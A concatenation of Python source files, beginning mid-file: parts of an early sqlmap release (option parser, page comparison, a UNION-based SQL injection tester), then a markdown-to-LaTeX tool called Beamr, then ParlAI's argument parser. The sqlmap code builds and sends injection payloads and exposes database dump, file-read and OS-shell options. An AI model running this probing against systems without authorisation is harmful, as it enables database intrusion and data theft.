                                    "(req: -T, opt: -D, -C, --start, --stop)")

        enumeration.add_option("--dump-all", dest="dumpAll", action="store_true",
                               help="Dump all DBMS databases tables entries")

        enumeration.add_option("-D", dest="db",
                               help="DBMS database to enumerate")

        enumeration.add_option("-T", dest="tbl",
                               help="DBMS database table to enumerate")

        enumeration.add_option("-C", dest="col",
                               help="DBMS database table column to enumerate")

        enumeration.add_option("-U", dest="user",
                               help="DBMS user to enumerate")

        enumeration.add_option("--exclude-sysdbs", dest="excludeSysDbs",
                               action="store_true",
                               help="Exclude DBMS system databases when "
                                    "enumerating tables")

        enumeration.add_option("--start", dest="limitStart", type="int",
                               help="First table entry to dump")

        enumeration.add_option("--stop", dest="limitStop", type="int",
                               help="Last table entry to dump")

        enumeration.add_option("--sql-query", dest="query",
                               help="SQL SELECT query to be executed")                    

        enumeration.add_option("--sql-shell", dest="sqlShell",
                               action="store_true",
                               help="Prompt for an interactive SQL shell")


        # File system options
        filesystem = OptionGroup(parser, "File system access", "These options "
                                 "can be used to access the back-end database "
                                 "management system file system taking "
                                 "advantage of native DBMS functions or "
                                 "specific DBMS design weaknesses.")

        filesystem.add_option("--read-file", dest="rFile",
                              help="Read a specific OS file content (only on MySQL)")

        filesystem.add_option("--write-file", dest="wFile",
                              help="Write to a specific OS file (not yet available)")


        # Takeover options
        takeover = OptionGroup(parser, "Operating system access", "This "
                               "option can be used to access the back-end "
                               "database management system operating "
                               "system taking advantage of specific DBMS "
                               "design weaknesses.")

        takeover.add_option("--os-shell", dest="osShell", action="store_true",
                            help="Prompt for an interactive OS shell "
                                 "(only on PHP/MySQL environment with a "
                                 "writable directory within the web "
                                 "server document root for the moment)")


        # Miscellaneous options
        miscellaneous = OptionGroup(parser, "Miscellaneous")

        miscellaneous.add_option("--eta", dest="eta", action="store_true",
                                 help="Retrieve each query output length and "
                                      "calculate the estimated time of arrival "
                                      "in real time")

        miscellaneous.add_option("--update", dest="updateAll", action="store_true",
                                help="Update sqlmap to the latest stable version")

        miscellaneous.add_option("-s", dest="sessionFile",
                                 help="Save and resume all data retrieved "
                                      "on a session file")

        miscellaneous.add_option("--save", dest="saveCmdline", action="store_true",
                                 help="Save options on a configuration INI file")

        miscellaneous.add_option("--batch", dest="batch", action="store_true",
                                 help="Never ask for user input, use the default behaviour")


        parser.add_option_group(target)
        parser.add_option_group(request)
        parser.add_option_group(injection)
        parser.add_option_group(techniques)
        parser.add_option_group(fingerprint)
        parser.add_option_group(enumeration)
        parser.add_option_group(filesystem)
        parser.add_option_group(takeover)
        parser.add_option_group(miscellaneous)

        (args, _) = parser.parse_args()

        if not args.url and not args.list and not args.googleDork and not args.configFile and not args.updateAll:
            errMsg  = "missing a mandatory parameter ('-u', '-l', '-g', '-c' or '--update'), "
            errMsg += "-h for help"
            parser.error(errMsg)

        return args
    except (OptionError, TypeError), e:
        parser.error(e)

    debugMsg = "parsing command line"
    logger.debug(debugMsg)

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re

from lib.core.data import conf
from lib.core.settings import MATCH_RATIO


def comparison(page, headers=None, getSeqMatcher=False):
    regExpResults = None

    # String to be excluded before calculating page hash
    if conf.eString and conf.eString in page:
        index              = page.index(conf.eString)
        length             = len(conf.eString)
        pageWithoutString  = page[:index]
        pageWithoutString += page[index+length:]
        page               = pageWithoutString

    # Regular expression matches to be excluded before calculating page hash
    if conf.eRegexp:
        regExpResults = re.findall(conf.eRegexp, page, re.I | re.M)

        if regExpResults:
            for regExpResult in regExpResults:
                index              = page.index(regExpResult)
                length             = len(regExpResult)
                pageWithoutRegExp  = page[:index]
                pageWithoutRegExp += page[index+length:]
                page               = pageWithoutRegExp

    # String to match in page when the query is valid
    if conf.string:
        if conf.string in page:
            return True
        else:
            return False

    # Regular expression to match in page when the query is valid
    if conf.regexp:
        if re.search(conf.regexp, page, re.I | re.M):
            return True
        else:
            return False

    # By default it returns sequence matcher between the first untouched
    # HTTP response page content and this content
    conf.seqMatcher.set_seq2(page)

    if getSeqMatcher:
        return round(conf.seqMatcher.ratio(), 5)                    

    elif round(conf.seqMatcher.ratio(), 5) >= MATCH_RATIO:                    
        return True

    else:
        return False

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



from lib.core.agent import agent
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.session import setUnion
from lib.request.connect import Connect as Request


def __effectiveUnionTest(query, comment):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """

    resultDict = {}

    for count in range(0, 50):
        if kb.dbms == "Oracle" and query.endswith(" FROM DUAL"):
            query = query[:-len(" FROM DUAL")]

        if count:                    
            query += ", NULL"

        if kb.dbms == "Oracle":
            query += " FROM DUAL"

        commentedQuery = agent.postfixQuery(query, comment)
        payload = agent.payload(newValue=commentedQuery)
        newResult = Request.queryPage(payload)                    

        if not newResult in resultDict.keys():
            resultDict[newResult] = (1, commentedQuery)
        else:
            resultDict[newResult] = (resultDict[newResult][0] + 1, commentedQuery)

        if count:                    
            for element in resultDict.values():                    
                if element[0] == 1:                    
                    if kb.injPlace == "GET":
                        value = "%s?%s" % (conf.url, payload)                    
                    elif kb.injPlace == "POST":
                        value  = "URL:\t'%s'" % conf.url
                        value += "\nPOST:\t'%s'\n" % payload                    
                    elif kb.injPlace == "Cookie":
                        value  = "URL:\t'%s'" % conf.url
                        value += "\nCookie:\t'%s'\n" % payload                    
                    elif kb.injPlace == "User-Agent":
                        value  = "URL:\t\t'%s'" % conf.url
                        value += "\nUser-Agent:\t'%s'\n" % payload                    

                    return value

    return None


def unionTest():
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    logMsg  = "testing inband sql injection on parameter "
    logMsg += "'%s'" % kb.injParameter
    logger.info(logMsg)

    value = ""

    query = agent.prefixQuery(" UNION ALL SELECT NULL")

    for comment in (queries[kb.dbms].comment, ""):
        value = __effectiveUnionTest(query, comment)

        if value:
            setUnion(comment, value.count("NULL"))

            break

    if kb.unionCount:
        logMsg  = "the target url could be affected by an "
        logMsg += "inband sql injection vulnerability"
        logger.info(logMsg)
    else:
        warnMsg  = "the target url is not affected by an "
        warnMsg += "inband sql injection vulnerability"
        logger.warn(warnMsg)

    return value

#!/usr/bin/env python3
# encoding: utf-8
'''
Beamr

@author:     Teodor Gherasim Nistor

@copyright:  2018 Teodor Gherasim Nistor

@license:    MIT License
'''
from __future__ import print_function
import sys
import beamr.debug as debug
from beamr import setup_arg, cli_name
from docopt import docopt


def main():
    halp = '''%s - %s

    Usage:
        %s [-n|-p <cmd>] [-q|-v] [-u|-s] [-c <cfg>] [--] [- | <input-file>] [- | <output-file>]
        %s (-h|-e [<editor>]) [-v]
        %s --version

    Options:
        -p <cmd>, --pdflatex=<cmd>  Specify pdflatex executable name and/or path to [default: pdflatex]
        -c <cfg>, --config=<cfg>    Override configuration. <cfg> must be valid Yaml
        -e, --edit-config     Open user configuration file for editing. An editor must be specified if configuration doesn't exist or doesn't mention one
        -n, --no-pdf   Don't create PDF output file (just generate Latex source)
        -u, --unsafe   Trust certain user input which cannot be verified
        -s, --safe     Don't trust user input which cannot be verified
        -v, --verbose  Print inner workings of the lexer-parser-interpreter cycle to stderr
        -q, --quiet    Print nothing except errors to stderr. If using Python >=3.6 this will also mute output from pdflatex
        -h, --help     Show this message and exit.
        --version      Print version information
''' % (setup_arg['name'], setup_arg['description'], cli_name, cli_name, cli_name)

    # Parse arguments nicely with docopt
    arg = docopt(halp,  version=setup_arg['version'])

    # Set logging level
    if arg['--verbose']:
        debug.verbose = True
    if arg['--quiet']:
        debug.quiet = True

    # Docopt arguments themselves need debugging sometimes...
    debug.debug('args:', str(arg).replace('\n', ''))

    # If configuration editing mode, delegate to Config
    from beamr.interpreters.config import Config
    if arg['--edit-config']:
        return Config.editUserConfig(arg['<editor>'])                    

    # Establish pdflatex command and parameters if required
    pdflatex = None
    if not arg['--no-pdf']:
        pdflatex = [arg['--pdflatex'], '-shell-escape']
        if arg['<output-file>']:
            outFile = arg['<output-file>']
            arg['<output-file>'] = None
            i = outFile.rfind('/') + 1
            if (i > 0):
                pdflatex.append('-output-directory=' + outFile[:i])
            pdflatex.append('-jobname=' + outFile[i:])

    # Open I/O files where relevant
    if arg['<input-file>']:
        sys.stdin = open(arg['<input-file>'], 'r')
    if arg['<output-file>']:
        sys.stdout = open(arg['<output-file>'], 'w')

    # Decode other configuration
    cmdlineSpecial = {}
    if arg['--safe']:
        cmdlineSpecial['safe'] = True
    elif arg['--unsafe']:
        cmdlineSpecial['safe'] = False
    Config.fromCmdline(arg['--config'], **cmdlineSpecial)

    # Only after setting logging level import our interpreters
    from beamr.interpreters import Document

    with sys.stdin:
        with sys.stdout:

            # Parse document
            doc = Document(sys.stdin.read())
            tex = str(doc)

            # Run pdflatex on obtained tex source
            if pdflatex:
                from subprocess import Popen, PIPE

                runkwarg = {'stdin': PIPE} # TODO Investigate encoding gotchas
                if debug.quiet:
                        runkwarg.update({'stdout': PIPE, 'stderr': PIPE})

                sp = Popen(pdflatex, **runkwarg)

                try: # Python 3
                    sp.communicate(bytes(tex, encoding='utf-8'))
                except: # Python 2
                    sp.communicate(bytes(tex))

                sp.stdin.close()
                rcode = sp.wait()

                if rcode:
                    debug.err('Fatal: pdflatex exited with nonzero status', rcode)
                    return rcode

            # Just output tex source
            else:
                print(tex)


if __name__ == "__main__":
    sys.exit(main())

'''
Created on 13 Nov 2017

@author: Teodor Gherasim Nistor
'''
from __future__ import print_function
import sys

file = sys.stderr                    
verbose = False                    
quiet = False                    

def debug(*arg):                    
    if verbose:
        print('DBG:', *arg, file=file)                    

def warn(*arg):                    
    if not quiet:                    
        print('WARN:', *arg, file=file)                    

def err(*arg):                    
    print('ERR:', *arg, file=file)                    



'''
Created on 6 Feb 2018

@author: Teodor Gherasim Nistor

'''
import os.path
import re
from beamr.lexers import imageLexer                    
from beamr.parsers import imageParser
from beamr.debug import debug, warn


class Text(object):
    
    def __init__(self, txt):                    
        self.txt = txt

    def __str__(self):
        return self.txt
    
    def __repr__(self):
        return self.__str__()


class Comment(Text):
    def __init__(self, txt):                    
        debug('Comment ', txt)                    
        super(Comment, self).__init__('% ' + txt)                    


class Escape(Text):
    def __init__(self, txt):                    
        super(Escape, self).__init__(txt[1:])


class Citation(Text):
    def __str__(self):
        from beamr.interpreters.config import Config
        if Config.effectiveConfig['bib']:                    
            return r'\cite{' + self.txt + '}'                    
        else:
            warn('Citations used but no bibliography file given.')                    
            return ''


class Url(Text):
    def __init__(self, txt):                    
        super(Url, self).__init__(r'\url{' + txt + '}')                    


class Heading(Text):
    usedMarkers = []
    formats = [                    
#         '\\chapter{ %s }\n', # Invalid?
        '\\section{ %s }\n',                    
        '\\subsection{ %s }\n',                    
        '\\subsubsection{ %s }\n'                    
        ]
    
    def __init__(self, txt):                    
        txt = txt.strip().splitlines()                    
        marker = txt[1][0]
        
        try:
            i = Heading.usedMarkers.index(marker)
        except:
            i = len(Heading.usedMarkers)
            Heading.usedMarkers.append(marker)

        if i > 2: # Anti-stupid
            warn("Something's wrong with heading marker", marker, 'having index', i)                    
            i = 2
            
        super(Heading, self).__init__(Heading.formats[i] % txt[0])                    
        debug('Heading level', i, marker, txt[0])                    


class ImageEnv(Text):
    # TODo cf \includepdf[pages=61,width=\paperwidth,height=\paperheight]{yourfile.pdf}

    markers = [r'\includegraphics[width=%.3f%s,height=%.3f%s]{%s}',
               r'\includegraphics[width=%.3f%s]{%s}',
               r'\includegraphics[height=%.3f%s]{%s}',
               r'\includegraphics[%s]{%s}']

    def __init__(self, txt):                    
        try:
            files, shape, align, dims = imageParser.parse(txt[2:-1].strip(), imageLexer)
            debug(files, shape, align, dims)

        # Anti-stupid: Ignore an empty environment
        except:
            super(ImageEnv, self).__init__('')
            return

        def singleImage(dims, files=None, file=None, implicitDims=r'width=\textwidth'):
            if not file:
                file = files[0][0]
            if dims[0]:
                if dims[1]:
                    return self.markers[0] % (dims[0][0], dims[0][1], dims[1][0], dims[1][1], file)
                else:
                    return self.markers[1] % (dims[0][0], dims[0][1], file)
            else:
                if dims[1]:
                    return self.markers[2] % (dims[1][0], dims[1][1], file)
                else:
                    return self.markers[3] % (implicitDims, file)


        def vStrip(dims, files):
            # Flatten into a vertical list
            return smartGrid(dims, [[file] for line in files for file in line], False)

        def hStrip(dims, files):
            # Flatten into a horizontal list
            return smartGrid(dims, [[file for line in files for file in line]], True)

        def grid(dims, files, implicitFillWidth=True):
            x=0
            y=len(files)
            for line in files:
                if len(line) > x:
                    x = len(line)
            dims = ((dims[0][0] / x, dims[0][1]) if dims[0] else None,
                    (dims[1][0] / y, dims[1][1]) if dims[1] else None)
            if not (dims[0] or dims[1]):
                if implicitFillWidth:
                    dims = ((1.0/x, r'\textwidth'), None)
                else:
                    dims = (None, (1.0/y, r'\textheight'))

            s = ''
            for line in files:
                for file in line:
                    s += singleImage(dims, file=file)
                s += r'\\'
            return s

        def smartGrid(dims, files, implicitFillWidth=True):
            warn('Image Frame: PIL support not yet implemented, falling back to basic grid. Some images may be distorted.')                    
            return grid(dims, files, implicitFillWidth)

        shapes = {'|': vStrip,
                  '-': hStrip,
                  '+': grid,
                  '#': smartGrid}

        super(ImageEnv, self).__init__(shapes.get(shape, singleImage)(dims, files))


class PlusEnv(Text):

    def __init__(self, txt):                    
        # TODO
        warn('Plus integration not yet implemented')                    
        super(PlusEnv, self).__init__( 'Plus: ' + txt)


class TableEnv(Text):
    
    def __init__(self, txt):                    
        # TODO
        warn('Tables not yet implemented')                    
        super(TableEnv, self).__init__( 'Table: ' + txt )


class ScissorEnv(Text):                    

    includeCmd = r'{\setbeamercolor{background canvas}{bg=}\includepdf%s{%%s}}'                    
    pagesSpec = '[pages={%s}]'                    

    def __init__(self, txt):                    
        super(ScissorEnv, self).__init__(self._init_helper(txt.strip().split()) + '\n')                    

    def _init_helper(self, arr):                    
        if len(arr) == 0:                    
            warn('Skipping empty scissor command')                    
            return ''

        if not (os.path.isfile(arr[0]) or os.path.isfile(arr[0] + '.pdf')):
            # TODO Link to safety net
            # if .safe:
            #     warn('File included in scissor command not found, omitting')
            #     return ''
            # else:
            warn('File included in scissor command not found, proceeding unsafely...')                    

        if len(arr) > 1:
            if re.fullmatch(r'\d+(-\d+)?(,\d+(-\d+)?)*', arr[1]):
                cmd = self.includeCmd % self.pagesSpec                    
                return cmd % (arr[1], arr[0])                    
            else:
                warn('Ignoring malformed page range in scissor command')                    
            if len(arr) > 2:                    
                warn('Ignoring extraneous arguments in scissor command')                    

        cmd = self.includeCmd % ''                    
        return cmd % arr[0]                    


class VerbatimEnv(Text):
    
    count=0
    todo = []
    preambleDefs = ''

    def __init__(self, head, body):
        self.__class__.count += 1
        self.__class__.todo.append(self)

        # Document.classResulutionSet.add(__class__)
        # TODO

        # We can use Config here as this part of the dict is not supposed to ever change
        from beamr.interpreters import Config
        lettr = ''
        num = self.__class__.count
        while num:
            lettr += chr(64 + num%27)
            num //= 27
        self.insertCmd = Config.get('vbtmCmds', 'insertion')(lettr)                    
        self.head = head
        self.body = body
        super(VerbatimEnv, self).__init__(self.insertCmd)

    @classmethod
    def resolve(cls):
        if cls.count:

            # Ensure proper package name is given
            from beamr.interpreters import Config
            package = Config.getRaw('verbatim')
            packageList = Config.getRaw('vbtmCmds', 'packageNames')                    
            if package not in packageList:
                package = packageList[0]
                Config.effectiveConfig['verbatim'] = package
            Config.effectiveConfig['packages'].append(package)

            cls.preambleDefs = Config.getRaw('vbtmCmds', 'once', package) + '\n'                    

            for f in cls.todo:
                if f.head:
                    cls.preambleDefs += Config.getRaw('vbtmCmds', 'foreach', package) % (                    
                             f.insertCmd,
                             f.head,
                             f.body)
                else:
                    cls.preambleDefs += Config.getRaw('vbtmCmds', 'foreachNoLang', package) % (                    
                             f.insertCmd,
                             f.body)

'''
Created on 1 Feb 2018

@author: Teodor Gherasim Nistor
'''
from ply import lex
from beamr.lexers.generic import t_error  # Used internally by lex() @UnusedImport
import beamr.interpreters
import beamr.debug as dbg

tokens = ('COMMENT', 'HEADING', 'SLIDE', 'SCISSOR', 'YAML', 'TEXT')                    

def t_COMMENT(t):
    r'#[\s\S]*?(\n|$)'
    t.value = beamr.interpreters.Comment(t.value)
    return t

def t_HEADING(t):
    r'(^|\n).+\n[_~=-]{4,}\n'                    
    t.value = beamr.interpreters.Heading(t.value)
    return t

def t_SLIDE(t):
    r'(^\[|\n\[)[\s\S]+?\n\]'                    
    t.value = beamr.interpreters.Slide(t.value)                    
    return t

def t_SCISSOR(t):
    r'(8<|>8){[\s\S]+?}'                    
    t.value = beamr.interpreters.ScissorEnv(t.value[3:-1])
    return t

def t_YAML(t):
    r'(^|\n)---\n[\s\S]*?(\n\.\.\.|$)'                    
    t.value = beamr.interpreters.Config(t.value)
    return t

# Rather, potential YAML. Parsing will be attempted, but may fail
t_TEXT = r'[\s\S]+?(?=(\n|\[|#|$|>|8))'                    

lexer = lex.lex(debug=dbg.verbose, reflags=0)

'''
Created on 1 Feb 2018

@author: Teodor Gherasim Nistor
'''
from beamr.debug import warn

def t_error(t):
    warn ('Skip lexing error..', t)                    
    t.lexer.skip(1)

'''
Created on 1 Feb 2018

@author: Teodor Gherasim Nistor
'''
from ply import lex
from beamr.lexers.generic import t_error  # Used internally by lex() @UnusedImport
from beamr.lexers.document import t_COMMENT  # Used internally by lex() @UnusedImport
import beamr

tokens = (
       'COMMENT',
       'ESCAPE',
       'STRETCH1',                    
       'STRETCH2',                    
       'EMPH',
       'CITATION',
       'FOOTNOTE',
       'URL',
       'LISTITEM',
       'COLUMN',
       'IMGENV',
       'PLUSENV',
       'TABENV',
       'VERBATIM',
       'MACRO',
       'BOX',
       'ANTIESCAPE',
       'TEXT',
       )


def t_ESCAPE(t):                    
    r'\\[^0-9A-Za-z\s]' # e.g. \# # Almost copy-paste from https://github.com/Khan/simple-markdown/blob/master/simple-markdown.js                    
    t.value = beamr.interpreters.Escape(t.value)                    
    return t

def t_STRETCH1(t):                    
    r'\[[<>_^:+]\]' # e.g. [+] # TODO Tailor to those actually used                    
    t.value = beamr.interpreters.Stretch(t.value[1])                    
    return t

def t_STRETCH2(t):                    
    r'\[[<>_v^].+?[<>_v^]\]' # e.g. [< Stretched text >]                    
    t.value = beamr.interpreters.Stretch(t.value[1]+t.value[-2], t.value[2:-2])                    
    return t

def t_EMPH(t):
    r'(?P<EMPH_FLAG>[*_~]{1,2})(?P<EMPH_TXT>[\S](.*?[\S])?)(?P=EMPH_FLAG)' # e.g. *Bold text*, ~Strikethrough text~                    
    global lexer                    
    gd = lexer.lexmatch.groupdict()                    
    t.value = beamr.interpreters.Emph(
        gd['EMPH_FLAG'], gd['EMPH_TXT'])
    return t

def t_CITATION(t):
    r'\[--.+?\]' # e.g. [fn:See attached docs]                    
    t.value = beamr.interpreters.Citation(t.value[3:-1])                    
    return t

def t_FOOTNOTE(t):
    r'\[-.+?-\]' # e.g. [fn:See attached docs]                    
    t.value = beamr.interpreters.Footnote(t.value[2:-2])
    return t

def t_URL(t):
    r'\[.+?\]' # e.g. [https://www.example.com/]
    t.value = beamr.interpreters.Url(t.value[1:-1])
    return t
    
# e.g.:
# - One
# *. Two
# -,+ Three
def t_LISTITEM(t):
    r'(^|\n)(?P<LI_INDENT> *)(\*|-)(|\.|,|=)(|\+) .*(\n((?P=LI_INDENT) .*| *))*(?=\n|$)'                    
    t.value = beamr.interpreters.ListItem(t.value)
    return t

# e.g.:
# |1.5
#   Column content
# |20%
#   Column content
def t_COLUMN(t):
    r'(^|\n)(?P<COL_INDENT> *)\|(\d*\.?\d+(%|)|) *(\n((?P=COL_INDENT) .*| *))+(?=\n|$)'                    
    t.value = beamr.interpreters.Column(t.value)
    return t

def t_IMGENV(t):
    r'~{[\s\S]*?}'
    t.value = beamr.interpreters.ImageEnv(t.value)
    return t

def t_PLUSENV(t):
    r'(^|\n)(?P<PLUS_INDENT> *)\[[\s\S]+\n(?P=PLUS_INDENT)\]'                    
    t.value = beamr.interpreters.PlusEnv(t.value)
    return t

def t_TABENV(t):
    r'={[\s\S]+?}'                    
    t.value = beamr.interpreters.TableEnv(t.value)                    
    return t

def t_VERBATIM(t):
    r'(^|\n)(?P<VBTM_INDENT> *){{(?P<VBTM_HEAD>.*)\n(?P<VBTM_BODY>[\s\S]+)\n(?P=VBTM_INDENT)}}'                    
    global lexer                    
    gd = lexer.lexmatch.groupdict()                    
    t.value = beamr.interpreters.VerbatimEnv(
        gd['VBTM_HEAD'].strip(), gd['VBTM_BODY'])
    return t

def t_MACRO(t):
    r'%{[\s\S]+?}'
    t.value = beamr.interpreters.Macro(t.value)
    return t

def t_BOX(t):
    r'(^|\n)(?P<BOX_INDENT> *)\((\*|!)[\s\S]+?\n(?P=BOX_INDENT)\)'                    
    t.value = beamr.interpreters.Box(t.value)                    
    return t

def t_ANTIESCAPE(t):
    r'[%&]'                    
    t.value = beamr.interpreters.Text('\\' + t.value)                    
    return t

def t_TEXT(t):
    r'[\s\S]+?(?=[^0-9A-Za-z\s]|\n|$)' # Inspired loosely from https://github.com/Khan/simple-markdown/blob/master/simple-markdown.js                    
    t.value = beamr.interpreters.Text(t.value)
    return t

lexer = lex.lex(debug=beamr.debug.verbose, reflags=0)

'''
Created on 1 Feb 2018

@author: Teodor Gherasim Nistor
'''
from beamr.parsers.generic import p_nil, p_error  # Used internally by yacc() @UnusedImport
from beamr.lexers.document import tokens  # Used internally by yacc() @UnusedImport
from ply import yacc
import beamr.debug as debug

start = 'main'

def p_main_notext(t):
    '''main : main COMMENT
            | main HEADING
            | main SLIDE
            | main SCISSOR
            | main YAML
            | nil'''
    if len(t) > 2:
        t[0] = t[1]
        t[0].append(t[2])
    else:
        t[0] = []

def p_main_text(t):
    '''main : main TEXT'''
    t[0] = t[1]

parser = yacc.yacc(tabmodule='document_parsetab', debugfile='document_parsedbg', debug=not debug.quiet)                    

'''
Created on 15 Feb 2018

@author: Teodor Gherasim Nistor
'''
import beamr.debug as debug
from beamr.parsers.generic import p_nil  # Used internally by yacc() @UnusedImport
from ply import yacc
from beamr.lexers.image import tokens  # Used internally by yacc() @UnusedImport

start = 'main'

def p_main(t):
    '''main : files shape align dims'''
    t[0] = (t[1], t[2], t[3], t[4])
        
def p_elem(t):
    '''files : files FILE
             | files QFILE
             | FILE
             | QFILE
             | files LF QFILE
             | files LF FILE'''
    if len(t) == 2:
        t[0] = [[t[1]]]
    elif len(t) == 3:
        t[0] = t[1]
        t[0][-1].append(t[2])
    else:
        t[0] = t[1]
        t[0].append([t[3]])


def p_shape(t):
    '''shape : VBAR
             | HBAR
             | PLUS
             | HASH
             | BIGO
             | nil'''
    t[0] = t[1]

def p_align(t):
    '''align : LEFT
             | RIGHT
             | UP
             | DOWN
             | nil'''
    t[0] = t[1]


# Lambda hack below caused by excesive caffeination
def p_dims_dim(t):
    '''dims : dim X dim
            | dim
            | X dim'''
    if len(t) == 2:
        t[0] = (_optional_format(t[1], 'width'),
                None)
    elif len(t) == 3:
        t[0] = (None,
                _optional_format(t[2], 'height'))
    else:
        t[0] = (_optional_format(t[1], 'width'),
                _optional_format(t[3], 'height'))

def p_dims_nil(t):
    '''dims : nil'''
    t[0] = (None, None)


def p_dim(p):
    '''dim : NUM UNIT
           | NUM'''
    fl = float(p[1])
    unit = p[2] if len(p) == 3 else None
    if not unit:
        if fl > 1.0:
            fl *= 0.01
        p[0] = (fl, r'\text%s', True)
    elif unit == '%':
        p[0] = (fl*0.01, r'\text%s', True)
    else:
        p[0] = (fl, unit, False)


def p_error(p):
    # TODO instead of discarding bad tokens, consider them file names, or pieces thereof, and return to lexer in a sensible fashion
    # BUT currently this fixes empty lines in image environment automagically so...
    if p:
        debug.warn('Syntax error in Image environment at "', p.value, '". Images or parameters may be missing from output.')
        global parser
        parser.errok()
    else:
        debug.warn('Syntax error at the end of Image environment.')

def _optional_format(a, b):
    if a[2]:
        return (a[0], a[1] % b)
    else:
        return (a[0], a[1])

parser = yacc.yacc(tabmodule='image_parsetab', debugfile='image_parsedbg', debug=not debug.quiet)                    

'''
Created on 1 Feb 2018

@author: Teodor Gherasim Nistor
'''
import beamr.debug as debug
from beamr.parsers.generic import p_nil, p_error  # Used internally by yacc() @UnusedImport
from ply import yacc
from beamr.lexers.slide import tokens  # Used internally by yacc() @UnusedImport

start = 'main'

def p_main(t):
    '''main : main elem
            | nil'''
    if len(t) > 2:
        t[0] = t[1]
        t[0].append(t[2])
    else:
        t[0] = []
        
def p_elem(t):
    '''elem : COMMENT
            | ESCAPE
            | STRETCH1                    
            | STRETCH2                    
            | EMPH
            | CITATION
            | FOOTNOTE
            | URL
            | LISTITEM
            | COLUMN
            | IMGENV
            | PLUSENV
            | TABENV
            | VERBATIM
            | MACRO
            | BOX
            | ANTIESCAPE
            | TEXT'''
    t[0] = t[1]

parser = yacc.yacc(tabmodule='slide_parsetab', debugfile='slide_parsedbg', debug=not debug.quiet)                    

# Copyright (c) 2017-present, Facebook, Inc.
# All rights reserved.
# This source code is licensed under the BSD-style license found in the
# LICENSE file in the root directory of this source tree. An additional grant
# of patent rights can be found in the PATENTS file in the same directory.
"""Provides an argument parser and a set of default command line options for
using the ParlAI package.
"""

import argparse
import importlib
import os
import sys
from parlai.core.agents import get_agent_module, get_task_module
from parlai.tasks.tasks import ids_to_tasks


def str2bool(value):
    v = value.lower()
    if v in ('yes', 'true', 't', '1', 'y'):
        return True
    elif v in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')


def str2class(value):
    """From import path string, returns the class specified. For example, the
    string 'parlai.agents.drqa.drqa:SimpleDictionaryAgent' returns
    <class 'parlai.agents.drqa.drqa.SimpleDictionaryAgent'>.
    """
    if ':' not in value:
        raise RuntimeError('Use a colon before the name of the class.')
    name = value.split(':')
    module = importlib.import_module(name[0])
    return getattr(module, name[1])


def class2str(value):
    """Inverse of params.str2class()."""
    s = str(value)
    s = s[s.find('\'') + 1:s.rfind('\'')]  # pull out import path
    s = ':'.join(s.rsplit('.', 1))  # replace last period with ':'
    return s


def modelzoo_path(datapath, path):
    """If path starts with 'models', then we remap it to the model zoo path
    within the data directory (default is ParlAI/data/models).
    ."""
    if path is None:
        return None
    if not path.startswith('models:'):
        return path
    else:
        # Check if we need to download the model
        animal = path[7:path.rfind('/')].replace('/', '.')
        module_name = f"parlai.zoo.{animal}"
        print(module_name)
        try:
            my_module = importlib.import_module(module_name)
            download = getattr(my_module, 'download')
            download(datapath)
        except (ModuleNotFoundError, AttributeError):
            pass
        return os.path.join(datapath, 'models', path[7:])


class ParlaiParser(argparse.ArgumentParser):
    """Pseudo-extension of ``argparse`` which sets a number of parameters
    for the ParlAI framework. More options can be added specific to other
    modules by passing this object and calling ``add_arg()`` or
    ``add_argument()`` on it.

    For example, see ``parlai.core.dict.DictionaryAgent.add_cmdline_args``.
    """

    def __init__(self, add_parlai_args=True, add_model_args=False):
        """Initializes the ParlAI argparser.
        - add_parlai_args (default True) initializes the default arguments for
        ParlAI package, including the data download paths and task arguments.
        - add_model_args (default False) initializes the default arguments for
        loading models, including initializing arguments from that model.
        """
        super().__init__(description='ParlAI parser.', allow_abbrev=False,
                         conflict_handler='resolve')
        self.register('type', 'bool', str2bool)
        self.register('type', 'class', str2class)
        self.parlai_home = (os.path.dirname(os.path.dirname(os.path.dirname(
                            os.path.realpath(__file__)))))
        os.environ['PARLAI_HOME'] = self.parlai_home

        self.add_arg = self.add_argument

        # remember which args were specified on the command line
        self.cli_args = sys.argv
        self.overridable = {}

        if add_parlai_args:
            self.add_parlai_args()
        if add_model_args:
            self.add_model_args()

    def add_parlai_data_path(self, argument_group=None):
        if argument_group is None:
            argument_group = self
        default_data_path = os.path.join(self.parlai_home, 'data')
        argument_group.add_argument(
            '-dp', '--datapath', default=default_data_path,
            help='path to datasets, defaults to {parlai_dir}/data')

    def add_mturk_args(self):
        mturk = self.add_argument_group('Mechanical Turk')
        default_log_path = os.path.join(self.parlai_home, 'logs', 'mturk')
        mturk.add_argument(
            '--mturk-log-path', default=default_log_path,
            help='path to MTurk logs, defaults to {parlai_dir}/logs/mturk')
        mturk.add_argument(
            '-t', '--task',
            help='MTurk task, e.g. "qa_data_collection" or "model_evaluator"')
        mturk.add_argument(
            '-nc', '--num-conversations', default=1, type=int,
            help='number of conversations you want to create for this task')
